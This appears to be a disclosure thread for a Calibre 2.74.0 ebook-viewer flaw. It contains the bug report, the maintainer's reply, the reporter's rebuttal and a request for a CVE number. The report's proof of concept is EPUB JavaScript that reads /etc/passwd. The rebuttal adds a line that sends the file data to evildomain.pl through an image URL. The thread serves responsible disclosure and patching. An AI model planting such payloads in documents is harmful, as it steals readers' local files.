### Bug Description

Hello,

Calibre can access the local files using javascript in epub file.

Code snippet:

<script src="<https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js>"></script>

<script>

    $.getScript( "../../../../../../../../etc/passwd", function( data, textStatus, jqxhr ) {

        document.write('<h1>Your data</h1><pre>' + data + '</pre>');

    });

</script>

Attacker can steal any victim file and send to server.

Tested on: Mac, i think it will work on any OS

Version: 2.74.0

This comes from the default security policy of Qt WebKit, which calibre

uses. While it is true that the javascript can be used to read any file

on the computer, the attacker cannot do anything with the data, since

connecting to remote urls is disabled. See the

LocalContentCanAccessRemoteUrls setting in <https://doc.qt.io/qt-4.8/qwebsettings.html#WebAttribute-enum>

Nonetheless, to be doubly secure, I will also turn off LocalContentCanAccessFileUrls

since as far as I can tell, it is not needed for the operation of the viewer.

Also, note that the viewer is in the process of being replaced with a

completely new implementation that only runs the ebook content in a

sandboxed iframe (you can see the new viewer implementation in action by

running it in your web browser via calibre-debug --new-server)

Hi,

i think it's not true that attacker cannot do anything with data. When I put img tag:

<img src="<http://remote_addres/some.jpg>"> Calibre will render this.

When attacker change document.write in payload to this:

document.write('<img src="<http://evildomain.pl/some.jpg?data='> + btoa(data) + '">');

could easily read data from server log.

Thank you for very fast fix :).

Subject: Requesting CVE for calibre file disclosure

Hello all,

Calibre 2.75 fixed what looks like a local data disclosure vulnerability:

  <https://github.com/kovidgoyal/calibre/commit/3a89718664cb8c>

@Kovid: Would you mind making the original Launchpad bug
<https://launchpad.net/bugs/1651728> public?

@osssec: Can you please assign a CVE on this one?

Thanks to Antoine for pointing this out, this deserves an update in stable
distro releases.

Martin
